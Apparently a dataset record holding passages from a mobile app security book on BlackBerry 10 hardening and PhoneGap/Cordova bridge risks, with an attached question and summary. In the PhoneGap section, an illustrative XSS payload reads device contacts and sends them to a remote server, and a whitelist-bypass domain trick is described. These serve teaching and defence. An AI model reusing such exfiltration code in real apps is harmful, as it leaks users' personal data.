Robustness Against Corruption\nQNX and thus BlackBerry 10 provide a number of standard library functions that you can use to influence the\nrobustness of the heap. Although using these functions will in most cases come with a performance penalty,\ntheir use can further frustrate exploitation of certain heap memory corruption scenarios.\nThe function malopt()\n(http://www.qnx.com/developers/docs/660/topic/com.qnx.doc.neutrino.lib_ref/topic/m/mallopt.html)\nprovides a couple of options that can be useful:\nMALLOC_VERIFY_ON to turn on additional verification when using allocator routines. If a problem is found, an\nassert will be raised.\nMALLOC_FREE_CHECK to protect against double frees.\nAdditionally, you can use the function mcheck() (http://www.qnx.com/developers/docs/660/index.jsp?\ntopic=%2Fcom.qnx.doc.neutrino.lib_ref%2Ftopic%2Fm%2Fmcheck.html) to turn on consistency checks within\nallocators with an abort handler callback specified by the developer. This may be preferable to using malopt and\nMALLOC_VERIFY_ON, which will result in an assert. However, the level of integrity checking that will be performed\nis highly dependent on the version of the allocator that your app is linked against.\nThe following list covers the allocator version and depth of mitigations against memory corruption:\nC library—Minimal consistency checking (although engineering has occurred to provide mitigation against\nsome exploitation techniques).\nNondebug version of the malloc library—A slightly greater level of consistency checking.\nDebug version of the malloc library—Extensive consistency checking, with tuning available through the\nuse of the mallopt() function.\nAs a result of these varying degrees of protection, avoiding heap corruption vulnerabilities that rely on the heap\nmanager to provide a significant degree of protection against a determined attacker is a better practice.\nQNX Native IPC Mechanism Security Considerations\nBecause BlackBerry 10 is built on top of QNX a range of QNX isms that exist with regards to IPC\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.neutrino.sys_arch/topic/ipc.html\nwhich if used need some thought around security.\nFollowing is a list of IPC security considerations and recommendations:\nIPC channels\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.neutrino.sys_arch/topic/ipc_channels.html\nusing IPC channels and specifically the ChannelCreate API\n(http://developer.blackberry.com/native/reference/core/com\n.qnx.doc.neutrino.lib_ref/topic/c/channelcreate.html), set _NTO_CHF_PRIVATE explicitly.\nShared memory\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.neutrino.sys_arch/topic/ipc_shared_memory.html\nit is initialized to zero (http://developer\n.blackberry.com/native/documentation/core/com.qnx.doc.neutrino\n.sys_arch/topic/ipc_init_mmap_memory.html).\nMost developers will likely stick to high-level constructs and also benefit from user/group separation within the\noperating system; as such, you may not have to be overly concerned with these.\nHeadless App Interprocess Communication\nIn BlackBerry 10.2.1 BlackBerry introduced the concept of headless apps (that is, background tasks) and a new\nAPI (http://developer.blackberry.com/native/documentation/cascades/device_platform/headless_apps/).\nFrom a security point of view the biggest consideration for developers is the Interprocess Communication (IPC)\nmechanism that will be used between the headless portion and user interface (UI).\nBlackBerry offers this advice on the topic of IPC:\nYou can use any IPC technique you want to communicate between the parts of your headless app; it’s\ncompletely up to you. You should determine the communication needs of your app and choose a solution (or\na combination of solutions) that makes the most sense for you.\nhttp://developer.blackberry.com/native/documentation/ cascades/device_platform/headless_apps/\nBlackBerry then goes on to suggest a number of options, which we’ve summarized and commented on from a\nsecurity perspective:\nInvocation Framework—This is only for UI-to-headless invocation. It cannot be used for headless-to-UI\ncommunication.\nLocal sockets—BlackBerry provides the option of using the QTcpSocket class\n(http://developer.blackberry.com/native/reference/cascades/qtcpsocket.html). Care must be taken\nwhen using TCP or UDP sockets for IPC mechanisms to ensure only legitimate local apps can communicate\nwith your UI or headless portion. We recommend using this option as a last resort due to the risk of\naccidental exposure of interfaces to potential unauthorized access.\nQSettings and file monitoring—BlackBerry provides another method of using the QSettings class\n(http://developer.blackberry.com/native/reference/cascades/qsettings.html). If using QSettings be\nsure to set the file in the app’s private data directory and not the shared files directory. This can be achieved\nwith code similar to this:\nQSettings setting(QDir::currentPath() + \"/data/Settings/NCCGroup/NCCGroup .conf\",\nQSettings::NativeFormat);\nAside from those explicitly mentioned in the headless API, BlackBerry 10 also provides a number of lower-level\noptions\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.neutrino.sys_arch/topic/ipc\n.html) that are inherited from the QNX base.\nThe biggest question to ask yourself—whatever IPC mechanism you choose—is whether it can be misused by a\nlocal app or remote attacker and if so what the consequences would be. By considering this threat up front, you\ncan select the most appropriate for your data transfer versus security requirements.\nSecuring BlackBerry 10 Cascades Applications\nBlackBerry 10 Cascades applications are native applications built using the Qt framework\n(http://developer.blackberry.com/native/documentation/cascades/dev/fundamentals/) and as a result have a\nnumber of unique security considerations. BlackBerry, as with the development of native applications, has been\nproactive in providing security advice to developers who are using Cascades to avoid some of the pitfalls\n(http://developer.blackberry.com/native/documentation/cascades/best_practices/security/index.html) in\naddition to issues inherited from using C and C++.\nThe biggest risk over and above memory corruption and arguably easier to exploit is content injection attacks.\nThe content injection attack risks arise from the fact that under the hood Cascades is JavaScript and HTML\ntechnology.\nBlackBerry provides advice around the following topics with regards to secure Cascades based applications:\nStrings—To protect against memory corruption.\nPassword fields—To ensure you don’t show the user’s password.\nFile paths—To mitigate against directory traversal.\nScript injection—By way of malicious QScript or JavaScript with the following big warning:\nWhen the QScriptEngine class is used to execute scripts, it is important that untrusted values are never\nappended to the string of the script that’s being executed. All scripts that are executed by a QScriptEngine\nshould be predefined when developing the application and should never be altered dynamically when the\napplication is running.\nFurthermore, you should never use import, Loader, or XMLHttpRequest to load JavaScript code that you don’t\ncontrol into QML. Running untrusted JavaScript code in QML can be equivalent to downloading and running\na malicious application. Unlike a desktop browser, the JavaScript execution environment doesn’t restrict\ncertain activities, such as accessing the local file system. For more information about QML and security, see\nQML Security.\nhttp://developer.blackberry.com/native/documentation/ cascades/best_practices/security/index.html\nHTML text formatting—Highlighting the risk of UI manipulation.\nThe QT project also provides specific further advice and examples around QML (http://qt-\nproject.org/doc/qt-4.8/qdeclarativesecurity.html) that demonstrate the content injection attacks but also\nhighlight what is safe. They aptly summarize the risk as follows:\nThe only reason this page is necessary at all is that JavaScript, when run in a web browser, has quite many\nrestrictions. With QML, you should neither rely on similar restrictions, nor worry about working around\nthem.\nhttp://qt-project.org/doc/qt-4.8/ qdeclarativesecurity.html\nSecuring BlackBerry 10 HTML5 and JavaScript (WebWorks) Applications\nBlackBerry 10 WebWorks applications as with their BlackBerry 7 cousins (see “BlackBerry WebWorks Security\non BlackBerry OS 7 and earlier”) are HTML5 and JavaScript and so suffer the risk of a variety of content\ninjection attacks such as cross-site-scripting and similar.\nApp Invocation Parameters\nWebWorks applications by default do not allow parameters to be passed to them when being invoked. If you\nspecify in the applications config.xml the <content> element with a rim:allowInvokeParams parameter this is no\nlonger the case. Take care if you specify this parameter to then validate and sanitize as appropriate any supplied\nparameters due to the risk of content injection or redirection-style attacks.\nFor further information, we suggest going to this link: http://developer\n.blackberry.com/html5/documentation/v2_1/content_element.html.\nAccess App Configuration Option\nWebWorks applications by default cannot access network resources or local file resources outside of the\napplications package. If you specify in the applications config.xml the <access> element this is no longer the\ncase. Care should be taken on two fronts. The first is for network resources to avoid wildcards wherever possible\nand only specify fully qualified domains and indicate if subdomains as allowed. However, the ability to use\nwildcards comes with the following caveat for AJAX requests (this is covered in the next section):\nThe wildcard character (*) cannot be used for data accessed by XMLHttpRequest. To access data using the\nXMLHttpRequest, you must explicitly specify each domain.\nhttps://developer.blackberry.com/html5/documentation/\nv2_1/accessing_external_resources_webworks.html\nThe second point to consider is to always use HTTPS (that is, an SSL/TLS protected connection) wherever\npossible to mitigate against man-in-the-middle type attacks.\nYou can find further reading at\nhttp://developer.blackberry.com/html5/documentation/v2_1/access_element.html\nhttp://developer.blackberry.com/html5/documentation/v2_1/accessing_\nexternal_resources_webworks.html#kba1393537416024\nWebsecurity App Configuration Option\nWebWorks applications cannot by default specify wildcards for AJAX requests. However, a dangerous option\nexists that allows you to override this. Specifying this in the config.xml,\n<feature id=\"FileName_blackberry.app\">\n<param name=\"websecurity\" value=\"disable\" />\n</feature>\n…then in the words of BlackBerry, it does the following:\n… will turn off the security measures that protect your application from untrusted content.\nTraditionally, a browser’s security model prevents content from different domains from interacting with each\nother, allowing developers to more easily include untrusted content without worrying about its effects.\nContent from a different domain (included via iframes, XHR, scripts or anything else) is limited from\ninteracting with your content, reducing the risk posed by malicious code.\nhttp://devblog.blackberry.com/2013/08/accessing- external-resources-in-a-blackberry-10-webworks-\napp-enterprise-dev-2/\nWhat does this do in practice? It basically disables the same-origin policy\n(http://en.wikipedia.org/wiki/Same-origin_policy), which is one of the core foundations of web security.\nThis is very dangerous and should be avoided if at all possible.\nYou can find further reading on this topic at\nhttp://developer.blackberry.com/html5/documentation/v2_1/ preference_element.html\nhttp://devblog.blackberry.com/2013/08/accessing-external-resources-in-a-blackberry-10-webworks-\napp-enterprise-dev-2/\nContent Injection Mitigations\nSuffice it to say, with WebWorks apps the biggest risk is content injection attacks such as cross-site scripting or\ncontent-manipulation or interception due to the lack of SSL.\nSo going above and beyond application innovation and the access and web security configuration options, the\nprimary method of defense will be to not use .innerHTML when constructing content within the DOM. Instead\nall HTML DOM objects should be built using CreateElement and the properties set with input validation where\nappropriate. Although taking this approach is more expensive in terms of development effort, it greatly reduces\nthe likelihood of content injection being possible in your app.\nSecuring Android Applications on BlackBerry 10\nRefer to the “Securing Android Applications” in Chapter 9 of this book.\nChapter 9 covers all the considerations one would expect. In terms of BlackBerry 10’s Android run time it’s\nimportant to recognize that the port is extensive. BlackBerry ported the binder Linux kernel driver used on\ntraditional Android devices to a QNX Resource Manager. The Dalvik VM and Zygote concept were also ported\nacross. As a result the ability to run native Android apps is indeed that native. A vast majority of the Android\nruntime is present allowing near seamless compatibility with a wide variety of apps.\nAs a result of this porting activity it is important to understand that the same inter-app attack paths (i.e., those\nthat go via Android IPC mechanisms) translate due to the wholesale porting of the runtime and framework.\nSummary\nThe security engineering that went into BlackBerry OS 7 and earlier was comprehensive, providing a rich and\nsophisticated functionality. However, it was also quite complicated to leverage all the built-in features to gain\nthe maximum level of security. This statement is especially true when you compare it against securing\nBlackBerry 10 applications where a lot is taken care of by the operating system by default.\nBlackBerry native applications bring with them a range of generic risks due to the use of C and C++. However,\ncompared to other operating systems such as Android and their relatively rich and complex intents, services,\nbinder and message interfaces, and broadcast receivers, BlackBerry is on the whole relatively simple to secure.\nThis is especially true if you stick to the higher-level IPC constructs and be careful where you store files.\nWith Cascades applications, from a security perspective you need to concern yourself with the\nrecommendations for native applications coupled with the risk of content injection attacks by virtue of the\nunderlying functionality provided by the Cascades/QT framework and the reliance on JavaScript.",
    "question": "What are the key security considerations for developing BlackBerry applications across different platforms and versions?",
    "summary": "This chapter discusses how to write secure BlackBerry applications, emphasizing the importance of considering security early in the development lifecycle. It covers specific security practices for BlackBerry OS 7.x legacy Java apps, including input validation, memory cleaning, file access control, and encryption. For BlackBerry 10 native, Cascades, and WebWorks applications, the focus is on preventing memory corruption, content injection, and ensuring secure communication, while also noting the importance of using the appropriate APIs and following best practices for each platform."
  },
  {
    "start": 103,
    "end": 107,
    "text": "CHAPTER 18\nCross-Platform Mobile Applications\nThis book has focused on the four mainstream mobile platforms: iOS, Android, Windows Phone, and\nBlackBerry. There is however a growing demand for mobile applications that can operate across multiple\nplatforms. This topic is now explored in this chapter.\nThis chapter introduces the subject of cross-platform mobile applications, exploring why they are a growing\ntrend and the benefits they bring to an organization. It also documents how cross-platform applications typically\noperate and expose native functionality, and how in some cases this can lead to serious vulnerabilities. The\ntypical security considerations for cross-platform applications are then illustrated using one of the most\ncommon frameworks, PhoneGap.\nIntroduction to Cross-Platform Mobile Applications\nCross-platform mobile applications, or hybrid applications as they are also sometimes referred to, are apps that\ncombine both web and mobile technologies to operate across multiple mobile platforms. This is typically\nachieved using platform-agnostic web programming languages such as HTML, JavaScript, and CSS that live in a\nplatform-specific native container.\nThe individual cross-platform applications are developed using a framework that provides the native container\nand execution environment for the application; this is typically nothing more than an embedded, platform-\nspecific web browser. For example, on iOS the embedded web browser is often just a UIWebView. However, the\npurpose of the framework doesn’t end there; it is also used to extend the functionality offered by HTML,\nJavaScript, and the like to allow access to the device’s native features, such as the camera, microphone, or other\nlocal resources.\nThe development of cross-platform mobile applications is a growing trend and one that we expect to continue to\ngain popularity in the future. There are a number of reasons why cross-platform mobile application\ndevelopment is becoming more prevalent, including but not limited to the following benefits:\nUse of mature and widely adopted programming languages—As previously noted, cross-platform\napplications are typically developed using HTML, JavaScript, and CSS. These are all widely adopted\nlanguages familiar to web developers, meaning that the learning curve for developing a cross-platform\napplication is relatively small. Furthermore, many organizations have existing web development teams,\nmeaning that it is not necessary to hire new people with specialized skills.\nReduced development costs—Developing a mobile application has often meant that you need one\ndevelopment team per platform due to the specialized skills required and the diversification of programming\nlanguages. One of the biggest advantages of a cross-platform application is that almost all the code is\nreusable across different platforms, and rather than having to independently develop a solution for each\nplatform, a single solution can be used. In most cases this can also be achieved using a single development\nteam. This reduction in effort allows organizations to minimize overheads and keep project costs down.\nSmoother release and update processes—One significant advantage that a cross-platform mobile\napplication has over native applications is that they do not need to abide by the traditional release and\nupdate processes. For example, if you wanted to release an update for your application you may simply be\nable to push down a new version of the HTML/JavaScript code without the user having to reinstall or update\nthe native application container.\nHowever, there are some downsides to using cross-platform mobile applications and they may not be a suitable\nfor all environments. For example, you may want to consider the following implications of using or developing a\ncross- platform app:\nSpeed—It stands to reason that as cross-platform applications are running in a web browser, they will be\nmuch slower than native applications because the code needs to be first interpreted and rendered before it is\ndisplayed in the browser, with the exception of platforms that use a native just-in-time (JIT) JavaScript\nengine.\nSource code—One disadvantage of using a cross-platform mobile application is that since it is developed\nusing client-side web languages, you give every user the source code to your app. If you want to develop an\napplication that uses some proprietary implementation and theft of intellectual property is a concern for you,\nthen a cross-platform mobile application is not a suitable method for your use case.\nThe market for cross-platform mobile application frameworks is relatively substantial and a number of different\noptions are available. The one that best fits your needs will depend entirely on the use case for your application\nand the platforms that you want to support. Some of the popular frameworks include:\nPhoneGap (http://phonegap.com/)\nAppcelerator (http://www.appcelerator.com/)\nCorona SDK (http://coronalabs.com/)\nXamarin (http://xamarin.com/)\nWhile many of the security considerations detailed in this chapter apply to all cross-platform mobile app\nframeworks, we will illustrate them using PhoneGap as an example.\nThe field of cross-platform mobile app security is an evolving one and, to date, significant investment in\nresearching the subject is lacking. There is however one notable academic paper\n(http://www.cs.utexas.edu/~shmat/shmat_ndss14nofrak.pdf) that documents this area and is recommended\nbackground reading.\nBridging Native Functionality\nOne of the primary purposes of the native container is to provide a bridge from the web-based application code\nto the native resources on the device. Without the native bridge, the functionality the application can offer\nwould be relatively limited. Cross-platform mobile app frameworks will typically expose APIs to JavaScript to\nfacilitate access to local resources, such as the following:\nThe camera\nThe microphone\nContact lists\nMedia (e.g., photos and videos)\nGeo-location information\nDevice orientation from the accelerometer\nIt is important to understand that the cross-platform application does not directly invoke the bridge. Instead, a\nplatform-independent API is presented by the framework. This API acts as a bridge between the web layer and\nthe local resource and provides a layer of abstraction so the application does not need to be aware of any specific\nplatform dependencies. It is also worth bearing in mind that the bridge is two-way; the native container needs to\nbe able to send results back to the web layer.\nAs you may have already guessed, a bridge between the web and local resources can have quite serious security\nimplications. In particular, exploitation of cross-site scripting or man-in-the-middle vulnerabilities become\nquite devastating for an application as they can be used to access device resources.\nThis section will briefly introduce how cross-platform frameworks implement native bridges across the different\nplatforms. This knowledge will be useful to you not only when assessing a cross-platform mobile application,\nbut also when reviewing any native applications that implement their own custom bridges.\nExposing Native Functionality on Android\nThe subject of native bridges on Android was briefly introduced in Chapter 7. However, for completeness, an\nillustration of how cross-platform frameworks implement a two-way native bridge is described in this section.\nThe WebView class provides the native container for cross-platform applications on Android. Java objects can be\ninjected in to the WebView and exposed to JavaScript using the addJavascriptInterface method. A simple\nexample illustrating how this can be implemented follows:\nwebView = (WebView) findViewById(R.id.webView1);\nwebView.addJavascriptInterface(new JavaScriptBridge(), \"bridge\");\nwebView.getSettings().setJavaScriptEnabled(true);\nwebView.setWebChromeClient(new WebChromeClient());\nwebView.loadUrl(\"file:///android_asset/main.html\");\npublic class JavaScriptBridge {\n@JavascriptInterface\npublic String helloWorld()\n{\nreturn \"Hello World!\";\n}\n}\nIn this example the helloWorld() method can be invoked from JavaScript, using the following code:\nvar HelloWorld = window.bridge.helloWorld();\nSince API version 17 only methods with the @JavascriptInterface annotation are available to JavaScript code.\nPrior to API version 17, reflection could be used to execute arbitrary code on the device (CVE-2012-6636), as\ndocumented in Chapter 7.\nThe addJavascriptInterface technique is not the only technique used to implement a native bridge. Another\ncommon strategy implemented by some cross-platform frameworks is to overwrite event handlers. This works\nfrom the native container, by overwriting the definition of what happens when the JavaScript alert prompt and\nconfirm events are invoked, allowing a custom callback to be defined from the Java container. For example, to\ndefine what happens any time the JavaScript alert() function is invoked, you might use the following code:\n@Override\npublic boolean onJsAlert(WebView view, String url, String message,\nfinal JsResult result)\n{\n//do something\nreturn true;\n}\nIt is common to see other event handlers such as onJsConfirm() or onJsPrompt() also overridden in a similar\nway.\nExposing Native Functionality on iOS\nImplementing a native bridge on iOS is slightly more complex than it is for Android because no API methods are\nexplicitly defined for this purpose. There is however a common hack to use when a native bridge is required.\nThis technique works by overloading the URL loading system so that arbitrary messages can be passed from\nJavaScript to a callback in the native UIWebView. Any time a URL is loaded within the Webview it invokes the\nshouldStartLoadWithRequest delegate method, which intercepts the full URL, including any parameters. The\nformat of the URL is typically used to pass messages from JavaScript to the native container. For example, the\nfollowing may be used to find a contact in the address book:\nwindow.location = mybridge://addressbook/search/contact?firstname=peter\nThe native container then implements the shouldStartLoadWithRequest delegate of the Webview using code\nsimilar to the following:\n- (BOOL)webView:(UIWebView*)webView\nshouldStartLoadWithRequest:(NSURLRequest*)request\nnavigationType:(UIWebViewNavigationType)navigationType {\nNSURL *URL = [request URL];\nif ([[URL scheme] isEqualToString:@\"mybridge\"]) {\n// parse URL, extract host and parameters to define actions\n}\n}\nThe shouldStartLoadWithRequest method would typically read in the URL, then separate and interpret each of\nthe URL components to determine what actions it should take.\nThe URL loading technique, however, provides only a one-way bridge from the web layer to the native container.\nIt is possible to create a bi-directional communication channel using a JavaScript callback and the\nstringByEvaluatingJavaScriptFromString method of the UIWebview class. For example, to execute a JavaScript\nmethod from the native container you might find code similar to the following:\n[webView stringByEvaluatingJavaScriptFromString: \\\n@\"receiveContact('%@','%@')\",firstname,surname];\nThis simple example would cause the receiveContact() JavaScript function to be executed, passing the\nNSString objects \"firstname\" and \"surname\" to JavaScript. When used in conjunction with\nshouldStartLoadWithRequest, this technique is capable of providing a rudimentary bridge between the native\nand web layers.\nExposing Native Functionality on Windows Phone\nNative bridges in Windows Phone are implemented using an event-driven system. Whilst disabled by default, a\ncallback from the web layer to the native Silverlight container can be enabled. This is done by first enabling the\nIsScriptEnabled property in the project, then handling the ScriptNotify event. A simple example of how you\nwould handle messages from JavaScript in your Silverlight WebBrowser control may look as follows:\nprivate void WebBrowser_ScriptNotify (object sender, NotifyEventArgs e)\n{\n// e.get_Value() object contains the message, parse and do actions\n}\nThe type of messages passed to the ScriptNotify event is entirely specific to the cross-platform framework.\nHowever, it is common to see the messages encapsulated in XML or JSON. The JavaScript code triggers the\nScriptNotify callback by invoking the notify() function:\nwindow.external.notify(jsonMessage);\nFor the web layer to receive the results of any operations, the native Silverlight application needs a means to\npass data to the JavaScript code. JavaScript can be executed directly in the DOM of the WebBrowser control using\nthe InvokeScript method:\nMyWebBrowser.InvokeScript(\"receiveContact\", firstname, surname);\nThis example would execute the receiveContact() JavaScript function with the \"firstname\" and \"surname\"\nvariables as arguments.\nExposing Native Functionality on BlackBerry\nBlackBerry is slightly different than the other platforms in that it already provides a native to web-layer bridge\nfor WebWorks applications. As detailed in Chapter 14, WebWorks are built upon the Apache Cordova framework\nand a set of standard Cordova APIs are provided (https://developer.blackberry.com/html5/apis/v2_2/). It is,\nhowever, possible to also build custom WebWorks extensions that bridge C/C++ and/or Qt code with the\nJavaScript and HTML5 web layer using JNEXT. This topic was detailed in Chapter 14 so will not be covered in\nthis section.\nBeyond WebWorks applications, it is also possible to create a native bridge in BlackBerry Cascades apps. Native\nbridges in Cascades applications can be implemented using the WebView class and the message passing handlers.\nJavaScript executing on the web-layer can first invoke the navigator.cascades.postMessage() method and store\na message handler in the navigator.cascades.onmessage property. A simple example of this may look as\nfollows:\nnavigator.cascades.postMessage(\"Message from javascript\");\nThe native container must then define the messageReceived() signal handler with an appropriate slot in the C++\nor QML code:\nconnectResult = connect(webView, SIGNAL(messageReceived(const \\\nQVariantMap&)), this, SLOT(onMessageReceived(const \\\nQVariantMap&)));\n[...]\nvoid WebViewBridge::onMessageReceived(const QVariantMap& message)\n{\nqDebug() << \"message.origin: \" << message[\"origin\"];\nqDebug() << \"message.data: \" << message[\"data\"];\n}\nTo pass messages from the native container to JavaScript, arbitrary JavaScript can be executed in the WebView\nusing the evaluateJavaScript() function:\nwebView->evaluateJavaScript(\"addContact(\" + firstname + \",\" \\\n+ surname + \")\");\nThis example illustrates how evaluateJavaScript() can be used to directly execute arbitrary JavaScript in a\nWebview. In this instance the addContact() JavaScript function is executed with the firstname and surname\nparameters passed as arguments. Combining this technique with a messageReceived() signal handler provides\nan effective means of creating a native bridge.\nExploring PhoneGap and Apache Cordova\nApache Cordova is an open-source framework for creating mobile applications. It originated from the PhoneGap\napplication whose developers donated the PhoneGap source code to the Apache Software Foundation in 2011.\nPhoneGap is perhaps the most popular framework for creating cross-platform mobile applications with over\n400,000 developers and one million downloads (http://phonegap.com/about/). PhoneGap currently supports a\nlarge number of mobile and desktop platforms, including Android, iOS, Windows Phone (7/8), BlackBerry,\nWindows 8, Tizen, Firefox OS, Ubuntu, and Amazon FireOS. PhoneGap applications are developed using\nHTML5, CSS3, and JavaScript.\nThis section will illustrate a number of security considerations for cross- platform mobile applications using\nCordova and PhoneGap as practical examples.\nStandard Features of PhoneGap\nThe PhoneGap API is relatively feature rich and provides access to many of the device’s native features,\nincluding the following:\nAccelerometer—Accesses the device’s motion sensor\nCamera—Captures a photo using the device’s camera\nCompass—Obtains the direction the device is pointing\nContacts—Works with the device’s contact database\nFilesystem—Hooks into the device’s filesystem\nGeolocation—Accesses the device’s GPS location\nMedia—Accesses or records videos, audio, or images\nNetwork—Accesses network information or performs network requests\nNotifications—Accesses or issues visual device notifications\nThese features will be of interest to you when assessing a PhoneGap application as it gives you an idea of what\nfeatures an attacker exploiting the app might be able to access. Any vulnerability that can be exploited to execute\narbitrary script may allow the attacker to invoke the APIs for malicious purposes.\nHere is a simple example of how you can use the PhoneGap API to take a photo using the device’s camera using\nthe getPicture() API call (https://github.com/apache/cordova-plugin-camera/blob/master/doc/index.md):\nnavigator.camera.getPicture(this.onPhotoDataSuccess, this.onFail, {\nquality: 50,\ndestinationType: Camera.DestinationType.DATA_URL,\nsourceType: Camera.PictureSourceType.CAMERA\n});\nThis example will take a photo using the device’s camera and return a base64-encoded string to the\nonPhotoDataSuccess() callback. In a cross-site scripting attack of a PhoneGap application, a malicious payload\ncould abuse this feature to take a photo and upload the base64-encoded image to an attacker-controlled server\nusing XMLHttpRequest() or PhoneGap API FileTransfer.upload()method.\nA malicious payload could also pilfer the device’s contact database using the PhoneGap Javascript API, a simple\nexample of how you might search for a user named “Herman” and upload their contact information to a remote\nweb server looks like this:\nfunction onSuccess(contacts) {\nvar url = \"http://www.mobileapphacker.com/getcontact\";\nvar params = \"givenname=\"+contacts[0].name.givenName+ \\\n\"familyname=\"+contacts[0].name.familyName;\nvar http = new XMLHttpRequest();\nhttp.open(\"GET\", url+\"?\"+params, true);\n};\nfunction onError(contactError) {\nalert('onError!');\n};\nvar options = new ContactFindOptions();\noptions.filter = \"Herman\";\noptions.multiple = true;\noptions.desiredFields = [navigator.contacts.fieldType.id];\nvar fields = [navigator.contacts.fieldType.displayName,\nnavigator.contacts.fieldType.name];\nnavigator.contacts.find(fields, onSuccess, onError, options);\nThe other features of PhoneGap can be accessed in a similar way; these examples serve to illustrate the\nsimplicity with which powerful native functionality can be accessed using JavaScript.\nPhoneGap and Cordova Security\nNeither PhoneGap nor the Cordova framework has come under any close scrutiny from the security community.\nHowever, as these technologies are a blend of native mobile applications and web applications it will come as no\nsurprise to you that much of what you have learned in the previous chapters is applicable to your testing\nmethodology. A number of framework-specific security considerations that you should be aware of are detailed\nin this section.\nFurthermore, as Cordova applications rely heavily on HTML5, there are a number of HTML5-specific security\nconcerns that apply. These will not be covered in this section but are detailed at length by OWASP\n(https://www.owasp .org/index.php/HTML5_Security_Cheat_Sheet).\nMULTIPLE VULNERABILITIES IN CORDOVA FRAMEWORK\nIn August 2014, David Kaplan and Roee Hay released a series of vulnerabilities that affected versions prior\nto 3.5.1 of the Cordova framework. When chained together and with some moderate user interaction,\nthese issues are capable of exfiltrating data from the filesystem of an Android device running a Cordova-\nbased application.\nTo learn more about these vulnerabilities you should consult the following whitepaper:\nhttps://www.slideshare.net/ibmsecurity/remote-exploitation- of-the-cordova-framework/\nWhile some of these issues are specific to the framework, they accurately describe the types of\nvulnerabilities found in cross-platform applications.\nCross-Application and Cross-Site Scripting Attacks\nCross-platform frameworks are heavily dependent on the Webview-embedded browser available across the\ndifferent platforms. It also stands to reason that any situation whereby attacker-controlled data is populated\ninto Webviews provides an opportunity for cross-application or cross-site scripting attacks. You should already\nhave an understanding of how cross-site scripting (XSS) attacks work. Cross-application scripting (XAS) attacks\nare a similar type of attack but with a slight twist; in this attack the scripting is loaded into the Webview by\nanother application. This type of attack can commonly occur in these scenarios:\nTainted content is loaded from a server-side web application (XSS) to the Webview\nArbitrary URLs passed from IPC mechanisms (XAS) are loaded\nArbitrary data is loaded via an IPC mechanism that is loaded into a Webview and dynamically populated into\na JavaScript block or passed directly to eval() (XAS)\nAn example of such a vulnerability was found in Cordova on Android (and by association also PhoneGap) by\nDavid Kaplan and Roee Hay and is described in CVE-2014-3500. This specific issue allowed an arbitrary URL to\nbe populated into a Cordova Webview when another third party application invoked an intent. The affected code\nexisted in the CordovaWebView class, which had a loadUrl() method similar to the following code:\n1 public void loadUrl(String url) {\n2 if(url.equals(\"about:blank\") || url.startsWith(\"javascript:\")) {\n3 this.loadUrlNow(url);\n4 } else{\n5 String initUrl=this.getProperty(\"url\",null);\n6\n7 if(initUrl==null){\n8 this.loadUrlIntoView(url);\n9 }\n10 else{\n11 this.loadUrlIntoView(initUrl);\n12 }\n13 }\n14 }\nThe vulnerable code loads the value of the initUrl parameter into the Webview, which is populated using the\nfollowing method:\n1 public String getProperty(String name, String defaultValue) {\n2 Bundle bundle=this.cordova.getActivity().getIntent().getExtras();\n3 if(bundle==null){\n4 return defaultValue;\n5 }\n6 Object p=bundle.get(name);\n7 if(p==null){\n8 return defaultValue;\n9 }\n10 return p.toString();\n11 }\nStudying the previous code should make the vulnerability relatively obvious; launching the activity with an\nintent bundle that includes a malicious URL will cause it to be populated into the Webview. To find out more\nabout how this issue was exploited you should refer to the whitepaper (https://www.slideshare\n.net/ibmsecurity/remote-exploitation-of-the-cordova-framework/).\nUnderstanding Domain Whitelisting\nDomain whitelisting is a security control present in PhoneGap and other Cordova-based applications. Domain\nwhitelisting defines the external domains outside of the application’s control but to which access should be\npermitted. Domains that are whitelisted will have access to the Cordova JavaScript objects and corresponding\nCordova bridge. The whitelist can be configured using the applications config.xml file, which may look as\nfollows:\n<access origin=\"https://mobileapphacker.com\" />\nThis example would permit access to any resources on the mobileapphacker.com domain but not subdomains,\nand only when using the HTTPS protocol. Subdomains could be permitted using the subdomains=\"true\"\nattribute.\nAn example of an insecure whitelist, which allows unrestricted access to any domain, would be:\n<access origin=\"*\" />\nYou should be aware that this is also the default configuration for a Cordova-based application.\nDomain whitelisting is an important security control when defining the resources that an application can access.\nAs you may recall from earlier chapters, due to the same origin policy any content loaded using the file://\nprotocol handler will have access to the filesystem. Therefore, any malicious third-party application that is able\nto exploit an XAS vulnerability and cause a URL from a shared resource on the local filesystem (e.g., /sdcard/)\nto be loaded, may be able to exploit the XAS issue to bypass sandbox restrictions and access content in the\nCordova-based application’s sandbox.\nIn the past the whitelist restrictions have been found to be subvertible. For example, in Cordova 2.9.x it was\ndiscovered that substrings of the domain could be used to bypass the whitelist. For example,\n“https://mobileapphacker.com .evil.com” could be used to bypass a whitelist for “mobileapphacker.com”. This\nis because the Cordova pattern-matching engine was matching anything after the domain (i.e.,\nhttps://mobileapphacker.com*) as valid. An attacker with the ability to create his own DNS records could then\nsubvert this logic using a subdomain. This was fixed in Cordova 3.x.\nThere are also some platform-specific quirks that you should be aware of. For example, domain whitelisting is\nnot supported on Android applications or devices that use API 10 or lower. While whitelisting can be bypassed in\nWindows Phone 7 and 8 applications by using an iframe or an XMLHttpRequest(), an attacker can load any\ndomain in an iframe or with AJAX and that domain will have access to the Cordova bridge.\nAPACHE CORDOVA WHITELIST BYPASS FOR NON-HTTP URLS\nApache Cordova for Android overloads the Android frameworks shouldInterceptRequest() method to\nintercept and inspect URLs before they are loaded. You should be aware that this method is not all\nencompassing and some protocols exist that cannot be intercepted using this technique. As of Android 4.4,\nWeb Sockets is one such protocol and could be used to bypass the Cordova whitelisting implementation.\nIframes and Callbacks\nWhen a whitelisted domain is loaded into the Webview, it has implicit access to the Cordova bridge. If, however,\na whitelisted domain also loads content via an iframe the loaded content will also have access to the bridge. A\nsimple example of that may be whitelisting an advertising network. If the ads are loaded by an iframe it may\ninadvertently expose the Cordova bridge to any third-party sites, meaning that a malicious ad could perform any\nactions that the Cordova application itself could perform. There is, however, one exception to this: when\nCordova is used on iOS. In this case all URLs are intercepted.\nEncrypted Storage\nCordova’s filesystem APIs do not support encryption. Instead, it relies on the default behavior of the platform.\nFor example, Cordova applications running on iOS 7 or above will inherit the default data protection class C\n(kSecAttrAccessibleAfterFirstUnlock) for data at rest encryption. However, on some platforms, such as\nWindows Phone, where encryption is not supported by default, content may be stored on the filesystem in\nplaintext. This is obviously a problem for applications that require secure, 